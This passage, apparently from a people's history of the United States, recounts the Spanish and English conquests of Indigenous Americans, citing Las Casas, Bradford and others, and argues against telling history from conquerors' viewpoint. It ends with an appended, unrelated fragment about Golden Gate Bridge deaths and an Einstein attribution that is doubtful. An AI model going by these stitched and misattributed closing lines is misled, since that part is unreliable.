When the Spaniards took prisoners they hanged them or burned them to death .
Among the Arawaks , mass suicides began , with cassava poison .
Infants were killed to save them from the Spaniards .
In two years , through murder , mutilation , or suicide , half of the 250,000 Indians on Haiti were dead .
When it became clear that there was no gold left , the Indians were taken as slave labor on huge estates , known later as encomiendas .
They were worked at a ferocious pace , and died by the thousands .
By the year 1515 , there were perhaps fifty thousand Indians left .
By 1550 , there were five hundred .
A report of the year 1650 shows none of the original Arawaks or their descendants left on the island .
The chief source - and , on many matters the only source - of information about what happened on the islands after Columbus came is Bartolome de las Casas , who , as a young priest , participated in the conquest of Cuba .
For a time he owned a plantation on which Indian slaves worked , but he gave that up and became a vehement critic of Spanish cruelty .
Las Casas transcribed Columbus 's journal and , in his fifties , began a multivolume History of the Indies .
In it , he describes the Indians .
They are agile , he says , and can swim long distances , especially the women .
They are not completely peaceful , because they do battle from time to time with other tribes , but their casualties seem small , and they fight when they are individually moved to do so because of some grievance , not on the orders of captains or kings .
Women in Indian society were treated so well as to startle the Spaniards .
Las Casas describes sex relations :
Marriage laws are non-existent men and women alike choose their mates and leave them as they please , without offense , jealousy or anger .
They multiply in great abundance ; pregnant women work to the last minute and give birth almost painlessly ; up the next day , they bathe in the river and are as clean and healthy as before giving birth .
If they tire of their men , they give themselves abortions with herbs that force stillbirths , covering their shameful parts with leaves or cotton cloth ; although on the whole , Indian men and women look upon total nakedness with as much casualness as we look upon a man 's head or at his hands .
The Indians , Las Casas says , have no religion , at least no temples .
They live in
large communal bell - shaped buildings , housing up to 600 people at one time ... made of very strong wood and roofed with palm leaves ....
They prize bird feathers of various colors , beads made of fishbones , and green and white stones with which they adorn their ears and lips , but they put no value on gold and other precious things .
They lack all manner of commerce , neither buying nor selling , and rely exclusively on their natural environment for maintenance .
They are extremely generous with their possessions and by the same token covet the possessions of their friends and expect the same degree of liberality .

In Book Two of his History of the Indies , Las Casas ( who at first urged replacing Indians by black slaves , thinking they were stronger and would survive , but later relented when he saw the effects on blacks ) tells about the treatment of the Indians by the Spaniards .
It is a unique account and deserves to be quoted at length :
Endless testimonies . .. prove the mild and pacific temperament of the natives ....
But our work was to exasperate , ravage , kill , mangle and destroy ; small wonder , then , if they tried to kill one of us now and then ....
The admiral , it is true , was blind as those who came after him , and he was so anxious to please the King that he committed irreparable crimes against the Indians ....
Las Casas tells how the Spaniards " grew more conceited every day " and after a while refused to walk any distance .
They " rode the backs of Indians if they were in a hurry " or were carried on hammocks by Indians running in relays .
" In this case they also had Indians carry large leaves to shade them from the sun and others to fan them with goose wings . "
Total control led to total cruelty .
The Spaniards " thought nothing of knifing Indians by tens and twenties and of cutting slices off them to test the sharpness of their blades . "
Las Casas tells how " two of these so - called Christians met two Indian boys one day , each carrying a parrot ; they took the parrots and for fun beheaded the boys . "
The Indians ' attempts to defend themselves failed .
And when they ran off into the hills they were found and killed .
So , Las Casas reports , " they suffered and died in the mines and other labors in desperate silence , knowing not a soul in the world to whom they could turn for help . "
He describes their work in the mines :
... mountains are stripped from top to bottom and bottom to top a thousand times ; they dig , split rocks , move stones , and carry dirt on their backs to wash it in the rivers , while those who wash gold stay in the water all the time with their backs bent so constantly it breaks them ; and when water invades the mines , the most arduous task of all is to dry the mines by scooping up pansful of water and throwing it up outside ....
After each six or eight months ' work in the mines , which was the time required of each crew to dig enough gold for melting , up to a third of the men died .
While the men were sent many miles away to the mines , the wives remained to work the soil , forced into the excruciating job of digging and making thousands of hills for cassava plants .
Thus husbands and wives were together only once every eight or ten months and when they met they were so exhausted and depressed on both sides ... they ceased to procreate .
As for the newly born , they died early because their mothers , overworked and famished , had no milk to nurse them , and for this reason , while I was in Cuba , 7000 children died in three months .
Some mothers even drowned their babies from sheer desperation .... in this way , husbands died in the mines , wives died at work , and children died from lack of milk . .. and in a short time this land which was so great , so powerful and fertile ... was depopulated .
...
My eyes have seen these acts so foreign to human nature , and now I tremble as I write .
...
When he arrived on Hispaniola in 1508 , Las Casas says , " there were 60,000 people living on this island , including the Indians ; so that from 1494 to 1508 , over three million people had perished from war , slavery , and the mines .
Who in future generations will believe this ?
I myself writing it as a knowledgeable eyewitness can hardly believe it .... "
Thus began the history , five hundred years ago , of the European invasion of the Indian settlements in the Americas .
That beginning , when you read Las Casas - even if his figures are exaggerations ( were there 3 million Indians to begin with , as he says , or less than a million , as some historians have calculated , or 8 million as others now believe ? ) - is conquest , slavery , death .
When we read the history books given to children in the United States , it all starts with heroic adventure - there is no bloodshed - and Columbus Day is a celebration .
Past the elementary and high schools , there are only occasional hints of something else .
Samuel Eliot Morison , the Harvard historian , was the most distinguished writer on Columbus , the author of a multivolume biography , and was himself a sailor who retraced Columbus 's route across the Atlantic .
In his popular book Christopher Columbus , Mariner , written in 1954 , he tells about the enslavement and the killing : " The cruel policy initiated by Columbus and pursued by his successors resulted in complete genocide . "
That is on one page , buried halfway into the telling of a grand romance .
In the book 's last paragraph , Morison sums up his view of Columbus :
He had his faults and his defects , but they were largely the defects of the qualities that made him great - his indomitable will , his superb faith in God and in his own mission as the Christ - bearer to lands beyond the seas , his stubborn persistence despite neglect , poverty and discouragement .
But there was no flaw , no dark side to the most outstanding and essential of all his qualities - his seamanship .
One can lie outright about the past .
Or one can omit facts which might lead to unacceptable conclusions .
Morison does neither .
He refuses to lie about Columbus .
He does not omit the story of mass murder ; indeed he describes it with the harshest word one can use : genocide .
But he does something else - he mentions the truth quickly and goes on to other things more important to him .
Outright lying or quiet omission takes the risk of discovery which , when made , might arouse the reader to rebel against the writer .
To state the facts , however , and then to bury them in a mass of other information is to say to the reader with a certain infectious calm : yes , mass murder took place , but it 's not that important - it should weigh very little in our final judgments ; it should affect very little what we do in the world .
It is not that the historian can avoid emphasis of some facts and not of others .
This is as natural to him as to the mapmaker , who , in order to produce a usable drawing for practical purposes , must first flatten and distort the shape of the earth , then choose out of the bewildering mass of geographic information those things needed for the purpose of this or that particular map .
My argument cannot be against selection , simplification , emphasis , which are inevitable for both cartographers and historians .
But the map - maker 's distortion is a technical necessity for a common purpose shared by all people who need maps .
The historian 's distortion is more than technical , it is ideological ; it is released into a world of contending interests , where any chosen emphasis supports ( whether the historian means to or not ) some kind of interest , whether economic or political or racial or national or sexual .
Furthermore , this ideological interest is not openly expressed in the way a mapmaker 's technical interest is obvious ( " This is a Mercator projection for long - range navigation - for short - range , you 'd better use a different projection " ) .
No , it is presented as if all readers of history had a common interest which historians serve to the best of their ability .
This is not intentional deception ; the historian has been trained in a society in which education and knowledge are put forward as technical problems of excellence and not as tools for contending social classes , races , nations .
To emphasize the heroism of Columbus and his successors as navigators and discoverers , and to de-emphasize their genocide , is not a technical necessity but an ideological choice .
It serves - unwittingly - to justify what was done .
My point is not that we must , in telling history , accuse , judge , condemn Columbus in absentia .
It is too late for that ; it would be a useless scholarly exercise in morality .
But the easy acceptance of atrocities as a deplorable but necessary price to pay for progress ( Hiroshima and Vietnam , to save Western civilization ; Kronstadt and Hungary , to save socialism ; nuclear proliferation , to save us all ) - that is still with us .
One reason these atrocities are still with us is that we have learned to bury them in a mass of other facts , as radioactive wastes are buried in containers in the earth .
We have learned to give them exactly the same proportion of attention that teachers and writers often give them in the most respectable of classrooms and textbooks .
This learned sense of moral proportion , coming from the apparent objectivity of the scholar , is accepted more easily than when it comes from politicians at press conferences .
It is therefore more deadly .
The treatment of heroes ( Columbus ) and their victims ( the Arawaks ) - the quiet acceptance of conquest and murder in the name of progress - is only one aspect of a certain approach to history , in which the past is told from the point of view of governments , conquerors , diplomats , leaders .
It is as if they , like Columbus , deserve universal acceptance , as if they - the Founding Fathers , Jackson , Lincoln , Wilson , Roosevelt , Kennedy , the leading members of Congress , the famous Justices of the Supreme Court - represent the nation as a whole .
The pretense is that there really is such a thing as " the United States , " subject to occasional conflicts and quarrels , but fundamentally a community of people with common interests .
It is as if there really is a " national interest " represented in the Constitution , in territorial expansion , in the laws passed by Congress , the decisions of the courts , the development of capitalism , the culture of education and the mass media .
" History is the memory of states , " wrote Henry Kissinger in his first book , A World Restored , in which he proceeded to tell the history of nineteenth - century Europe from the viewpoint of the leaders of Austria and England , ignoring the millions who suffered from those statesmen 's policies .
From his standpoint , the " peace " that Europe had before the French Revolution was " restored " by the diplomacy of a few national leaders .
But for factory workers in England , farmers in France , colored people in Asia and Africa , women and children everywhere except in the upper classes , it was a world of conquest , violence , hunger , exploitation - a world not restored but disintegrated .
My viewpoint , in telling the history of the United States , is different : that we must not accept the memory of states as our own .
Nations are not communities and never have been ,
The history of any country , presented as the history of a family , conceals fierce conflicts of interest ( sometimes exploding , most often repressed ) between conquerors and conquered , masters and slaves , capitalists and workers , dominators and dominated in race and sex .
And in such a world of conflict , a world of victims and executioners , it is the job of thinking people , as Albert Camus suggested , not to be on the side of the executioners .
Thus , in that inevitable taking of sides which comes from selection and emphasis in history , I prefer to try to tell the story of the discovery of America from the viewpoint of the Arawaks , of the Constitution from the standpoint of the slaves , of Andrew Jackson as seen by the Cherokees , of the Civil War as seen by the New York Irish , of the Mexican war as seen by the deserting soldiers of Scott 's army , of the rise of industrialism as seen by the young women in the Lowell textile mills , of the Spanish - American war as seen by the Cubans , the conquest of the Philippines as seen by black soldiers on Luzon , the Gilded Age as seen by southern farmers , the First World War as seen by socialists , the Second World War as seen by pacifists , the New Deal as seen by blacks in Harlem , the postwar American empire as seen by peons in Latin America .
And so on , to the limited extent that any one person , however he or she strains , can " see " history from the standpoint of others .
My point is not to grieve for the victims and denounce the executioners .
Those tears , that anger , cast into the past , deplete our moral energy for the present .
And the lines are not always clear .
In the long run , the oppressor is also a victim .
In the short run ( and so far , human history has consisted only of short runs ) , the victims , themselves desperate and tainted with the culture that oppresses them , turn on other victims .
Still , understanding the complexities , this book will be skeptical of governments and their attempts , through politics and culture , to ensnare ordinary people in a giant web of nationhood pretending to a common interest .
I will try not to overlook the cruelties that victims inflict on one another as they are jammed together in the boxcars of the system .
I do n't want to romanticize them .
But I do remember ( in rough paraphrase ) a statement I once read : " The cry of the poor is not always just , but if you do n't listen to it , you will never know what justice is . "
I do n't want to invent victories for people 's movements .
But to think that history - writing must aim simply to recapitulate the failures that dominate the past is to make historians collaborators in an endless cycle of defeat .
If history is to be creative , to anticipate a possible future without denying the past , it should , I believe , emphasize new possibilities by disclosing those hidden episodes of the past when , even if in brief flashes , people showed their ability to resist , to join together , occasionally to win .
I am supposing , or perhaps only hoping , that our future may be found in the past 's fugitive moments of compassion rather than in its solid centuries of warfare .
That , being as blunt as I can , is my approach to the history of the United States .
The reader may as well know that before going on .
What Columbus did to the Arawaks of the Bahamas , Cortes did to the Aztecs of Mexico , Pizarro to the Incas of Peru , and the English settlers of Virginia and Massachusetts to the Powhatans and the Pequots .
The Aztec civilization of Mexico came out of the heritage of Mayan , Zapotec , and Toltec cultures .
It built enormous constructions from stone tools and human labor , developed a writing system and a priesthood .
It also engaged in ( let us not overlook this ) the ritual killing of thousands of people as sacrifices to the gods .
The cruelty of the Aztecs , however , did not erase a certain innocence , and when a Spanish armada appeared at Vera Cruz , and a bearded white man came ashore , with strange beasts ( horses ) , clad in iron , it was thought that he was the legendary Aztec man - god who had died three hundred years before , with the promise to return - the mysterious Quetzalcoatl .
And so they welcomed him , with munificent hospitality .
That was Hernando Cortes , come from Spain with an expedition financed by merchants and landowners and blessed by the deputies of God , with one obsessive goal : to find gold .
In the mind of Montezuma , the king of the Aztecs , there must have been a certain doubt about whether Cortes was indeed Quetzalcoatl , because he sent a hundred runners to Cortes , bearing enormous treasures , gold and silver wrought into objects of fantastic beauty , but at the same time begging him to go back .
( The painter Durer a few years later described what he saw just arrived in Spain from that expedition - a sun of gold , a moon of silver , worth a fortune . )
Cortes then began his march of death from town to town , using deception , turning Aztec against Aztec , killing with the kind of deliberateness that accompanies a strategy - to paralyze the will of the population by a sudden frightful deed .
And so , in Cholulu , he invited the headmen of the Cholula nation to the square .
And when they came , with thousands of unarmed retainers , Cortes 's small army of Spaniards , posted around the square with cannon , armed with crossbows , mounted on horses , massacred them , down to the last man .
Then they looted the city and moved on .
When their cavalcade of murder was over they were in Mexico City , Montezuma was dead , and the Aztec civilization , shattered , was in the hands of the Spaniards .
All this is told in the Spaniards ' own accounts .
In Peru , that other Spanish conquistador Pizarro , used the same tactics , and for the same reasons - the frenzy in the early capitalist states of Europe for gold , for slaves , for products of the soil , to pay the bondholders and stockholders of the expeditions , to finance the monarchical bureaucracies rising in Western Europe , to spur the growth of the new money economy rising out of feudalism , to participate in what Karl Marx would later call " the primitive accumulation of capital . "
These were the violent beginnings of an intricate system of technology , business , politics , and culture that would dominate the world for the next five centuries .
In the North American English colonies , the pattern was set early , as Columbus had set it in the islands of the Bahamas .
In 1585 , before there was any permanent English settlement in Virginia , Richard Grenville landed there with seven ships .
The Indians he met were hospitable , but when one of them stole a small silver cup , Grenville sacked and burned the whole Indian village .
Jamestown itself was set up inside the territory of an Indian confederacy , led by the chief , Powhatan .
Powhatan watched the English settle on his people 's land , but did not attack , maintaining a posture of coolness .
When the English were going through their " starving time " in the winter of 1610 , some of them ran off to join the Indians , where they would at least be fed .
When the summer came , the governor of the colony sent a messenger to ask Powhatan to return the runaways , whereupon Powhatan , according to the English account , replied with " noe other than prowde and disdaynefull Answers . "
Some soldiers were therefore sent out " to take Revenge . "
They fell upon an Indian settlement , killed fifteen or sixteen Indians , burned the houses , cut down the corn growing around the village , took the queen of the tribe and her children into boats , then ended up throwing the children overboard " and shoteinge owit their Braynes in the water . "
The queen was later taken off and stabbed to death .
Twelve years later , the Indians , alarmed as the English settlements kept growing in numbers , apparently decided to try to wipe them out for good .
They went on a rampage and massacred 347 men , women , and children .
From then on it was total war .
Not able to enslave the Indians , and not able to live with them , the English decided to exterminate them .
Edmund Morgan writes , in his history of early Virginia , American Slavery , American Freedom :
Since the Indians were better woodsmen than the English and virtually impossible to track down , the method was to feign peaceful intentions , let them settle down and plant their corn wherever they chose , and then , just before harvest , fall upon them , killing as many as possible and burning the corn ... .
Within two or three years of the massacre the English had avenged the deaths of that day many times over .
In that first year of the white man in Virginia , 1607 , Powhatan had addressed a plea to John Smith that turned out prophetic .
How authentic it is may be in doubt , but it is so much like so many Indian statements that it may be taken as , if not the rough letter of that first plea , the exact spirit of it :
I have seen two generations of my people die ....
I know the difference between peace and war better than any man in my country .
I am now grown old , and must die soon ; my authority must descend to my brothers , Opitehapan , Opechancanough and Catatough - then to my two sisters , and then to my two daughters - I wish them to know as much as I do , and that your love to them may be like mine to you .
Why will you take by force what you may have quietly by love ?
Why will you destroy us who supply you with food ?
What can you get by war ?
We can hide our provisions and run into the woods ; then you will starve for wronging your friends .
Why are you jealous of us ?
We are unarmed , and willing to give you what you ask , if you come in a friendly manner , and not so simple as not to know that it is much better to eat good meat , sleep comfortably , live quietly with my wives and children , laugh and be merry with the English , and trade for their copper and hatchets , than to run away from them , and to lie cold in the woods , feed on acorns , roots and such trash , and be so hunted that I can neither eat nor sleep .
In these wars , my men must sit up watching , and if a twig break , they all cry out " Here comes Captain Smith ! "
So I must end my miserable life .
Take away your guns and swords , the cause of all our jealousy , or you may all die in the same manner .
When the Pilgrims came to New England they too were coming not to vacant land but to territory inhabited by tribes of Indians .
The governor of the Massachusetts Bay Colony , John Winthrop , created the excuse to take Indian land by declaring the area legally a " vacuum . "
The Indians , he said , had not " subdued " the land , and therefore had only a " natural " right to it , but not a " civil right . "
A " natural right " did not have legal standing .
The Puritans also appealed to the Bible , Psalms 2:8 : " Ask of me , and I shall give thee , the heathen for thine inheritance , and the uttermost parts of the earth for thy possession . "
And to justify their use of force to take the land , they cited Romans 13:2 : " Whosoever therefore resisteth the power , resisteth the ordinance of God : and they that resist shall receive to themselves damnation . "
The Puritans lived in uneasy truce with the Pequot Indians , who occupied what is now southern Connecticut and Rhode Island .
But they wanted them out of the way ; they wanted their land .
And they seemed to want also to establish their rule firmly over Connecticut settlers in that area .
The murder of a white trader , Indian - kidnaper , and troublemaker became an excuse to make war on the Pequots in 1636 .
A punitive expedition left Boston to attack the Narraganset Indians on Block Island , who were lumped with the Pequots .
As Governor Winthrop wrote :
They had commission to put to death the men of Block Island , but to spare the women and children , and to bring them away , and to take possession of the island ; and from thence to go to the Pequods to demand the murderers of Captain Stone and other English , and one thousand fathom of wampum for damages , etc. and some of their children as hostages , which if they should refuse , they were to obtain it by force .
The English landed and killed some Indians , but the rest hid in the thick forests of the island and the English went from one deserted village to the next , destroying crops .
Then they sailed back to the mainland and raided Pequot villages along the coast , destroying crops again .
One of the officers of that expedition , in his account , gives some insight into the Pequots they encountered : " The Indians spying of us came running in multitudes along the water side , crying , What cheer , Englishmen , what cheer , what do you come for ?
They not thinking we intended war , went on cheerfully ... -"
So , the war with the Pequots began .
Massacres took place on both sides .
The English developed a tactic of warfare used earlier by Cortes and later , in the twentieth century , even more systematically : deliberate attacks on noncombatants for the purpose of terrorizing the enemy .
This is ethno historian Francis Jennings 's interpretation of Captain John Mason 's attack on a Pequot village on the Mystic River near Long Island Sound : " Mason proposed to avoid attacking Pequot warriors , which would have overtaxed his unseasoned , unreliable troops .
Battle , as such , was not his purpose .
Battle is only one of the ways to destroy an enemy 's will to fight .
Massacre can accomplish the same end with less risk , and Mason had determined that massacre would be his objective . "
So the English set fire to the wigwams of the village .
By their own account : " The Captain also said , We must Burn Them ; and immediately stepping into the Wigwam ... brought out a Fire Brand , and putting it into the Matts with which they were covered , set the Wigwams on Fire . "
William Bradford , in his History of the Plymouth Plantation written at the time , describes John Mason 's raid on the Pequot village :
Those that scaped the fire were slaine with the sword ; some hewed to peeces , others rune throw with their rapiers , so as they were quickly dispatchte , and very few escaped .
It was conceived they thus destroyed about 400 at this time .
It was a fearful sight to see them thus frying in the fyer , and the streams of blood quenching the same , and horrible was the stincke and sente there of , but the victory seemed a sweete sacrifice , and they gave the prayers thereof to God , who had wrought so wonderfully for them , thus to inclose their enemise in their hands , and give them so speedy a victory over so proud and insulting an enimie .
As Dr. Cotton Mather , Puritan theologian , put it : " It was supposed that no less than 600 Pequot souls were brought down to hell that day . "
The war continued .
Indian tribes were used against one another , and never seemed able to join together in fighting the English .
Jennings sums up :
The terror was very real among the Indians , but in time they came to meditate upon its foundations .
They drew three lessons from the Pequot War : ( 1 ) that the Englishmen 's most solemn pledge would be broken whenever obligation conflicted with advantage ; ( 2 ) that the English way of war had no limit of scruple or mercy ; and ( 3 ) that weapons of Indian making were almost useless against weapons of European manufacture .
These lessons the Indians took to heart .
A footnote in Virgil Vogel 's book This Land Was Ours ( 1972 ) says : " The official figure on the number of Pequots now in Connecticut is twenty - one persons . "
Forty years after the Pequot War , Puritans and Indians fought again .
This time it was the Wampanoags , occupying the south shore of Massachusetts Bay , who were in the way and also beginning to trade some of their land to people outside the Massachusetts Bay Colony .
Their chief , Massasoit , was dead .
His son Wamsutta had been killed by Englishmen , and Wamsuttas brother Metacom ( later to be called King Philip by the English ) became chief .
The English found their excuse , a murder which they attributed to Metacom , and they began a war of conquest against the Wampanoags , a war to take their land .
They were clearly the aggressors , but claimed they attacked for preventive purposes .
As Roger Williams , more friendly to the Indians than most , put it : " All men of conscience or prudence ply to windward , to maintain their wars to be defensive . "
Jennings says the elite of the Puritans wanted the war ; the ordinary white Englishman did not want it and often refused to fight .
The Indians certainly did not want war , but they matched atrocity with atrocity .
When it was over , in 1676 , the English had won , but their resources were drained ; they had lost six hundred men .
Three thousand Indians were dead , including Metacom himself .
Yet the Indian raids did not stop .
For a while , the English tried softer tactics .
But ultimately , it was back to annihilation .
The Indian population of 10 million that lived north of Mexico when Columbus came would ultimately be reduced to less than a million .
Huge numbers of Indians would die from diseases introduced by the whites .
A Dutch traveler in New Netherland wrote in 1656 that " the Indians ... affirm , that before the arrival of the Christians , and before the smallpox broke out amongst them , they were ten times as numerous as they now are , and that their population had been melted down by this disease , whereof nine - tenths of them have died . "
When the English first settled Martha 's Vineyard in 1642 , the Wampanoags there numbered perhaps three thousand .
There were no wars on that island , but by 1764 , only 313 Indians were left there .
Similarly , Block Island Indians numbered perhaps 1,200 to 1,500 in 1662 , and by 1774 were reduced to fifty - one .
Behind the English invasion of North America , behind their massacre of Indians , their deception , their brutality , was that special powerful drive born in civilizations based on private property .
It was a morally ambiguous drive ; the need for space , for land , was a real human need .
But in conditions of scarcity , in a barbarous epoch of history ruled by competition , this human need was transformed into the murder of whole peoples .
Roger Williams said it was
a depraved appetite after the great vanities , dreams and shadows of this vanishing life , great portions of land , land in this wilderness , as if men were in as great necessity and danger for want of great portions of land , as poor , hungry , thirsty seamen have , after a sick and stormy , a long and starving passage .
This is one of the gods of New England , which the living and most high Eternal will destroy and famish .
Was all this bloodshed and deceit - from Columbus to Cortes , Pizarro , the Puritans - a necessity for the human race to progress from savagery to civilization ?
Was Morison right in burying the story of genocide inside a more important story of human progress ?
Perhaps a persuasive argument can be made - as it was made by Stalin when he killed peasants for industrial progress in the Soviet Union , as it was made by Churchill explaining the bombings of Dresden and Hamburg , and Truman explaining Hiroshima .
But how can the judgment be made if the benefits and losses cannot be balanced because the losses are either unmentioned or mentioned quickly ?
That quick disposal might be acceptable ( " Unfortunate , yes , but it had to be done " ) to the middle and upper classes of the conquering and " advanced " countries .
But is it acceptable to the poor of Asia , Africa , Latin America , or to the prisoners in Soviet labor camps , or the blacks in urban ghettos , or the Indians on reservations - to the victims of that progress which benefits a privileged minority in the world ?
Was it acceptable ( or just inescapable ? ) to the miners and railroaders of America , the factory hands , the men and women who died by the hundreds of thousands from accidents or sickness , where they worked or where they lived - casualties of progress ?
And even the privileged minority - must it not reconsider , with that practicality which even privilege cannot abolish , the value of its privileges , when they become threatened by the anger of the sacrificed , whether in organized rebellion , unorganized riot , or simply those brutal individual acts of desperation labeled crimes by law and the state ?
If there are necessary sacrifices to be made for human progress , is it not essential to hold to the principle that those to be sacrificed must make the decision themselves ?
We can all decide to give up something of ours , but do we have the right to throw into the pyre the children of others , or even our own children , for a progress which is not nearly as clear or present as sickness or health , life or death ?
What did people in Spain get out of all that death and brutality visited on the Indians of the Americas ?
For a brief period in history , there was the glory of a Spanish Empire in the Western Hemisphere .
As Hans Koning sums it up in his book Columbus : His Enterprise :
For all the gold and silver stolen and shipped to Spain did not make the Spanish people richer .
It gave their kings an edge in the balance of power for a time , a chance to hire more mercenary soldiers for their wars .
They ended up losing those wars anyway , and all that was left was a deadly inflation , a starving population , the rich richer , the poor poorer , and a ruined peasant class .
Beyond all that , how certain are we that what was destroyed was inferior ?
Who were these people who came out on the beach and swam to bring presents to Columbus and his crew , who watched Cortes and Pizarro ride through their countryside , who peered out of the forests at the first white settlers of Virginia and Massachusetts ?
Columbus called them Indians , because he miscalculated the size of the earth .
In this book we too call them Indians , with some reluctance , because it happens too often that people are saddled with names given them by their conquerors .
And yet , there is some reason to call them Indians , because they did come , perhaps 25,000 years ago , from Asia , across the land bridge of the Bering Straits ( later to disappear under water ) to Alaska .
Then they moved southward , seeking warmth and land , in a trek lasting thousands of years that took them into North America , then Central and South America .
In Nicaragua , Brazil , and Ecuador their petrified footprints can still be seen , along with the print of bison , who disappeared about five thousand years ago , so they must have reached South America at least that far back
Widely dispersed over the great land mass of the Americas , they numbered approximately 75 million people by the time Columbus came , perhaps 25 million in North America .
Responding to the different environments of soil and climate , they developed hundreds of different tribal cultures , perhaps two thousand different languages .
They perfected the art of agriculture , and figured out how to grow maize ( corn ) , which cannot grow by itself and must be planted , cultivated , fertilized , harvested , husked , shelled .
They ingeniously developed a variety of other vegetables and fruits , as well as peanuts and chocolate and tobacco and rubber .
On their own , the Indians were engaged in the great agricultural revolution that other peoples in Asia , Europe , Africa were going through about the same time .
While many of the tribes remained nomadic hunters and food gatherers in wandering , egalitarian communes , others began to live in more settled communities where there was more food , larger populations , more divisions of labor among men and women , more surplus to feed chiefs and priests , more leisure time for artistic and social work , for building houses .
About a thousand years before Christ , while comparable constructions were going on in Egypt and Mesopotamia , the Zuni and Hopi Indians of what is now New Mexico had begun to build villages consisting of large terraced buildings , nestled in among cliffs and mountains for protection from enemies , with hundreds of rooms in each village .
Before the arrival of the European explorers , they were using irrigation canals , dams , were doing ceramics , weaving baskets , making cloth out of cotton .
By the time of Christ and Julius Caesar , there had developed in the Ohio River Valley a culture of so - called Moundbuilders , Indians who constructed thousands of enormous sculptures out of earth , sometimes in the shapes of huge humans , birds , or serpents , sometimes as burial sites , sometimes as fortifications .
One of them was 3 1/2 miles long , enclosing 100 acres .
These Moundbuilders seem to have been part of a complex trading system of ornaments and weapons from as far off as the Great Lakes , the Far West , and the Gulf of Mexico .
About A.D. 500 , as this Moundbuilder culture of the Ohio Valley was beginning to decline , another culture was developing westward , in the valley of the Mississippi , centered on what is now St. Louis .
It had an advanced agriculture , included thousands of villages , and also built huge earthen mounds as burial and ceremonial places near a vast Indian metropolis that may have had thirty thousand people .
The largest mound was 100 feet high , with a rectangular base larger than that of the Great Pyramid of Egypt .
In the city , known as Cahokia , were toolmakers , hide dressers , potters , jewelry makers , weavers , salt makers , copper engravers , and magnificent ceramists .
One funeral blanket was made of twelve thousand shell beads .
From the Adirondacks to the Great Lakes , in what is now Pennsylvania and upper New York , lived the most powerful of the northeastern tribes , the League of the Iroquois , which included the Mohawks ( People of the Flint ) , Oneidas ( People of the Stone ) , Onondagas ( People of the Mountain ) , Cayugas ( People at the Landing ) , and Senecas ( Great Hill People ) , thousands of people bound together by a common Iroquois language .
In the vision of the Mohawk chief Iliawatha , the legendary Dekaniwidah spoke to the Iroquois : " We bind ourselves together by taking hold of each other 's hands so firmly and forming a circle so strong that if a tree should fall upon it , it could not shake nor break it , so that our people and grandchildren shall remain in the circle in security , peace and happiness . "
In the villages of the Iroquois , land was owned in common and worked in common .
Hunting was done together , and the catch was divided among the members of the village .
Houses were considered common property and were shared by several families .
The concept of private ownership of land and homes was foreign to the Iroquois .
A French Jesuit priest who encountered them in the 1650s wrote : " No poorhouses are needed among them , because they are neither mendicants nor paupers .. . .
Their kindness , humanity and courtesy not only makes them liberal with what they have , but causes them to possess hardly anything except in common . "
Women were important and respected in Iroquois society .
Families were matrilineal .
That is , the family line went down through the female members , whose husbands joined the family , while sons who married then joined their wives ' families .
Each extended family lived in a " long house . "
When a woman wanted a divorce , she set her husband 's things outside the door .
Families were grouped in clans , and a dozen or more clans might make up a village .
The senior women in the village named the men who represented the clans at village and tribal councils .
They also named the forty - nine chiefs who were the ruling council for the Five Nation confederacy of the Iroquois .
The women attended clan meetings , stood behind the circle of men who spoke and voted , and removed the men from office if they strayed too far from the wishes of the women .
The women tended the crops and took general charge of village affairs while the men were always hunting or fishing .
And since they supplied the moccasins and food for warring expeditions , they had some control over military matters .
As Gary B. Nash notes in his fascinating study of early America , Red , White , and Black : " Thus power was shared between the sexes and the European idea of male dominancy and female subordination in all things was conspicuously absent in Iroquois society . "
Children in Iroquois society , while taught the cultural heritage of their people and solidarity with the tribe , were also taught to be independent , not to submit to overbearing authority .
They were taught equality in status and the sharing of possessions .
The Iroquois did not use harsh punishment on children ; they did not insist on early weaning or early toilet training , but gradually allowed the child to learn self - care .
All of this was in sharp contrast to European values as brought over by the first colonists , a society of rich and poor , controlled by priests , by governors , by male heads of families .
For example , the pastor of the Pilgrim colony , John Robinson , thus advised his parishioners how to deal with their children : " And surely there is in all children ... a stubbornness , and stoutness of mind arising from natural pride , which must , in the first place , be broken and beaten down ; that so the foundation of their education being laid in humility and tractableness , other virtues may , in their time , be built thereon . "
Gary Nash describes Iroquois culture :
No laws and ordinances , sheriffs and constables , judges and juries , or courts or jails - the apparatus of authority in European societies - were to be found in the northeast woodlands prior to European arrival .
Yet boundaries of acceptable behavior were firmly set .
Though priding themselves on the autonomous individual , the Iroquois maintained a strict sense of right and wrong ....
He who stole another 's food or acted invalourously in war was " shamed " by his people and ostracized from their company until he had atoned for his actions and demonstrated to their satisfaction that he had morally purified himself .
Not only the Iroquois but other Indian tribes behaved the same way .
In 1635 , Maryland Indians responded to the governor 's demand that if any of them killed an Englishman , the guilty one should be delivered up for punishment according to English law .
The Indians said :
It is the manner amongst us Indians , that if any such accident happen , wee doe redeeme the life of a man that is so slaine , with a 100 armes length of Beades and since that you are heere strangers , and come into our Countrey , you should rather conform yourselves to the Customes of our Countrey , than impose yours upon us ....
So , Columbus and his successors were not coming into an empty wilderness , but into a world which in some places was as densely populated as Europe itself , where the culture was complex , where human relations were more egalitarian than in Europe , and where the relations among men , women , children , and nature were more beautifully worked out than perhaps any place in the world .
They were people without a written language , but with their own laws , their poetry , their history kept in memory and passed on , in an oral vocabulary more complex than Europe 's , accompanied by song , dance , and ceremonial drama .
They paid careful attention to the development of personality , intensity of will , independence and flexibility , passion and potency , to their partnership with one another and with nature .
John Collier , an American scholar who lived among Indians in the 1920s and 1930s in the American Southwest , said of their spirit : " Could we make it our own , there would be an eternally inexhaustible earth and a forever lasting peace . "
Perhaps there is some romantic mythology in that .
But the evidence from European travelers in the sixteenth , seventeenth , and eighteenth centuries , put together recently by an American specialist on Indian life , William Brandon , is overwhelmingly supportive of much of that " myth . "
Even allowing for the imperfection of myths , it is enough to make us question , for that time and ours , the excuse of progress in the annihilation of races , and the telling of history from the standpoint of the conquerors and leaders of Western civilization .
" Not everything that counts can be counted , and not everything that can be counted counts . " - From a sign hanging in Albert Einstein 's office at Princeton .
Storyline :
1 . The famous Golden Gate Bridge was the largest suspension bridge in the world at the time of its completion in 1937 .
Joseph Strauss , the chief engineer who designed the bridge , demanded extremely rigorous safety precautions that were not normally used in those times .
Some of these , like using a safety net , are now amongst today ’s most basic safety standards .
During those times , " one life lost for every million dollars spent " was considered normal and acceptable .
Since the bridge cost $ 35 million dollars , the fact that only 11 people died during its construction was hailed as an all - time record , and a magnificent achievement .
Indeed , 11 deaths resulting from the project instead of 35 could be considered a good reduction .
